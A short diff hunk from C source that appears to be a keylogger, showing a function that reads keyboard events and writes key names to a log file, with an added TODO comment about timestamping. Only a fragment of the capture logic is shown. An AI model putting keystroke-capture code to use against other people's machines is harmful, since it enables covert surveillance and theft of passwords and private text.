@@ -241,6 +241,7 @@ void* start_keylogging(int kb_fd, FILE *log_file){
             }
             char *name = get_key_text(event.code, shift_pressed);
             if (strcmp(name, "\0") != 0) {
+                /***TODO - change this to timestamped_write**/
                 fprintf(log_file, "%s",name);
             }
         } else if (event.value == KEY_RELEASE) {
